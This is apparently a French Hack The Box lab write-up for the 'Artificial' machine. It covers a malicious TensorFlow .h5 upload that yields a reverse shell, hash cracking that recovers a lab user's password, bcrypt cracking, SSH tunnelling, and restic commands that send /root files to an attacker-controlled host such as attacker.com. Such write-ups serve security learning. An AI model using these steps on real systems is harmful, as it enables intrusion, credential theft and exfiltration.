---
parent: \[[[HTB MOC Linux]]\]
tags:
  - 
  - 
  - 
date: 2025-09-10T15:19
tasks:
  - mise en page
category:
  - writeups
  - htb
difficulty: easy
os: linux
title: Artifical
description: This is an artificial reconsitution of a Writeup
season: "8"
seasonal: yes
---

# Enumeration

On commence par regarder ce à quoi on fait face. Ici, tout est simple, on a un site internet. on regarde donc un peu ce qu'on peut faire, on peut s'inscrire et se connecter. En regardant rapidement et testant des creds admin, on ne trouve rien.

On s'inscrit au site pour tester puis on se connecte et on tombe sur une page qui nous permet d'upload des fichiers. On peut penser aux files upload mais on ne trouve rien pour le moment. Un filtre nous empêche d'upload autre chose que des fichier h5. On peut tenter aussi quelques astuces avec les magic number, mais ici rien de tout ça est nécessaire, on peut se contenter de trouver un h5 malicieux.

# Foothold

En cherchant un peu sur le web (i.e. en cherchant "h5 exploit"), on trouve un [[https://github.com/Splinter0/tensorflow-rce|repo git]] qui nous donne un fichier python nous permettant de créer un exploit. On modifie le fichier exploit.py avec notre IP et port et on ouvre un listener sur ce même port.

Ensuite, on se rend sur le site, qui nous donne une config docker pour pouvoir créer un fichier h5. Ca tombe bien, c'est la config qu'il nous faut pour lancer notre exploit. On utilise donc la commande
```/artificial
docker build -t exploith5 .
```
dans le répertoire du Dockerfile afin de créer une image docker. Ensuite, on lance cette image docker et on exécute dessus notre exploit
```
docker run --rm --entrypoint python -v /home/kali/HTB/artificial:/artificial exploith5 /artificial/exploit.py   
```
On rajoute ici les paramètres --rm pour supprimer les containers existants sur la même image, s'ils existent, -v pour monter le directory /home/... et pour le monter à /artificial (séparé par ':') et enfin on ajoute la commande à la fin. On modifie tout de même un peu exploit.py en modifiant
```
model.save("exploit.h5")
```
en
```
model.save("/artificial/model.h5)
```
Pour que ça sauvegarde dans le répertoire monté.
Une fois cela fait, on obtient notre exploit, on l'upload sur le site et on teste notre modèle (bouton intégré pour exécuter un modèle). Juste comme ça, on obtient notre revshell vers l'utilisateur app.


# Lateral movement

Avant toute chose, on upgrade notre shell
```
python3 -c 'import pty;pty.spawn("/bin/bash");'
```
^Z
```
stty raw -echo; fg
stty rows 24 cols 80
export TERM=xterm-256color
exec /bin/bash
```

On se balade un peu dans le répertoire et on trouve un dossier instance puis, dedans, un fichier users.db. Pas besoin d'être devin, c'est notre foothold pour le lateral movement. On utilise sqlite3:
```
sqlite3 users.db
```
on observe un peu le fichier et on trouve un utilisateur 'gael', son mot de passe et son email. Or il se trouve qu'un utilisateur gael est aussi existant sur la machine. On copie donc son mot de passe et on le teste, ça ne foncitonne pas. On voit que cela ressemble à un hash, on le passe dans crackstation et on trouve une correspondance:
`c99175974b6e192936d97224638a34f8:md5:mattp005numbertwo`
On tente et on trouve que bingo, `mattp005numbertwo` est bien son mot de passe. On a maintenant un accès à l'utilisateur gael. on peut passer à la privesc, après avoir choppé le flag.



# Privilege Escalation

On commence par regarder ce qu'on peut trouver avec les vulnérabilités classiques mais rien ne se présente. On passe donc à linpeas et plusieurs pistes se précisent. Déjà, une CVE quasi-certaine: CVE-2021-3560, on y reviendra plus tard.
On voit aussi des mots de passe
```
/etc/pam.d/passwd
/etc/passwd
/usr/share/bash-completion/completions/passwd
/usr/share/lintian/overrides/passwd
```
mais aussi des fichiers de backup
```
/etc/lvm/backup
/var/backups
```
et d'autres passwords
```
/etc/pam.d/common-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
```

On tente un peu tout mais rien ne fonctionne, il se trouve que tout cela était des fausses pistes. A la place, il suffisait d'utiliser la commande
```
id
```
pour voir que le groupe était inhabituel, de lister les fichiers du groupe
```
find / -group sysadm
```
pour trouver un tar.gz d'une backup, ensuite de trouver, dans cette backup extraite, le dossier `.config`, puis dedans un fichier .json, dans lequel on trouve un mdp en bcrypt
```backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```
ce password est chiffré en base64. Le déchiffrer nous donne un mot de passe bcrypt
```
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

On veut décoder ce mot de passe, on tente donc avec un dictionnaire. On lance John dessus:
```
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt bcrypt.txt
john --show --format=bcrypt bcrypt.txt
```
et on obtient
```john response
!@#$%^
```

En cherchant un peu plus dans les docs, on trouve que backrest est exécuté sur le port 9898. On met donc en place un ssh forwarding avec
```attacker
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```
On accède ensuite au site depuis notre machine en se connectant à `locahost:9898`, on rentre les identifiants et on obtient bien l'accès au site.

On cherche un peu et on voit un bouton "run command". En cliquant dessus, on voit que cela nous permet d'exécuter une commande restic. En cherchant sur gtfobins (et en sachant que backrest est utilisé en tant que root), on peut exécuter une commande qui nous donnera les fichiers que l'on veut:
```
RHOST=attacker.com
RPORT=12345
LFILE=/root/root.txt
NAME=root_backup
sudo restic backup -r "rest:http://$RHOST:$RPORT/$NAME" "$LFILE"
```
mais avant il nous faut mettre en place un serveur restic
```
git clone https://github.com/restic/rest-server.git
cd rest-server
GOARCH=amd64 GOOS=linux go build -o rest-server ./cmd/rest-server
./rest-server --path /tmp/restictemp --listen :8888 --no-auth
```

Puis, sur le serveur web, on créé rapidement un repo avant d'exécuter les commandes
```
-r rest:http://<yourip>:8888/root_backup init
-r rest:http://<yourip>:8888/root_backup backup /root
```

Et enfin, sur notre attacker
```
restic -r /tmp/restictemp/root_backup snapshots
restic -r /tmp/restictemp/root_backup restore <snapshot_id> --target ./restore
```

Enfin, on utilise la commande
```
cat restore/root/root.txt
```
et on obtient notre root flag!!

# Conclusion

Cette machine était plutôt particulière. Chaque challenge était assez simple mais il est vrai que je me suis cassé la tête sur des choses bêtes. Je ne suis pas forcément allé au plus simple et reste encore trop de temps sur une solution qui ne fonctionnera pas. 

J'ai eu des bonnes idées tout de même, surtout vers la fin, j'ai pu comprendre ce que je faisais, donc c'est plutôt positif. 

Je dois quand même revoir comment j'ai fait le ssh tunneling, partie que je ne comprends pas et pour laquelle je n'aurais pas eu l'idée (je ne comprends pas comment on forward un port tcp par une connexion ssh).

J'ai aussi passé une journée à comprendre ce qu'étaient docker, les images et containers, kali, les mises à jour de kali, les repo et packages, et malgré les apparences, les tunnels ssh et les différentes façons de bypass un NAT pour obtenir un [reverse shell](ReverseShells) ce qui est vraiment bien. J'en ressors avec pas mal de connaissances en plus, qui m'ont l'air bien solides, surtout sur le côté NAT et les différentes façon de les bypass.